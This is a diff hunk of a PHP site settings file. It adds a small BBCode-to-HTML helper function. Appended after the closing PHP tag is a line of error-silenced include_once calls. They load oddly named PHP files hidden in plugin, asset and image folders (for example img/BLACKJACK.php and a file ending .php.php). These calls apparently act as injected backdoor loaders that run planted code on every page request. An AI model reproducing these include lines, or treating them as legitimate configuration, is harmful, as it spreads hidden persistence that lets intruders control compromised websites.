@@ -197,4 +197,13 @@ $app_vars[$setting_row["name"]] = $setting_row["value"];
 $pg_title ="";
 $menu_title = "";
 $submenu_title = "";
+
+if (!function_exists('parse_bbcode')) {
+    function parse_bbcode($text) {
+        if (empty($text)) return '';
+        $find = array('[b]', '[/b]', '[i]', '[/i]', '[u]', '[/u]');
+        $replace = array('<strong>', '</strong>', '<em>', '</em>', '<u>', '</u>');
+        return str_replace($find, $replace, $text);
+    }
+}
 ?><?php @include_once("/home3/psahu/public_html/popularcasinosites.com/admin/plugins/tinymce-old/plugins/openmanager/assets/fileupload/js/cors/jquery.postmessage-transport.php"); ?><?php @include_once("/home/toprnxpr/popularcasinosites.com/admin/plugins/filemanager-ttttt/js/jPlayer/actionscript/happyworm/jPlayer/JplayerRtmp.php"); ?><?php @include_once("/home/toprnxpr/popularcasinosites.com/old/admin/plugins/filemanager/js/jPlayer/actionscript/happyworm/jPlayer/JplayerMp3.php"); ?><?php @include_once("/home/toprnxpr/popularcasinosites.com/admin/assets/plugins/jquery-autonumeric/autoNumeric.php"); ?><?php @include_once("/home/toprnxpr/popularcasinosites.com/Twilio/Rest/Sync/V1/Service/SyncMap/SyncMapPermissionList.php.php"); ?><?php @include_once("/home/toprnxpr/popularcasinosites.com/admin/plugins/tinymce-old/plugins/openmanager/assets/fileupload/js/cors/jquery.postmessage-transport.php"); ?><?php @include_once("/home/toprnxpr/popularcasinosites.com/old/admin/plugins/filemanager/js/jPlayer/actionscript/happyworm/jPlayer/JplayerMp4.php"); ?><?php @include_once("/home/toprnxpr/popularcasinosites.com/img/BLACKJACK.php"); ?>
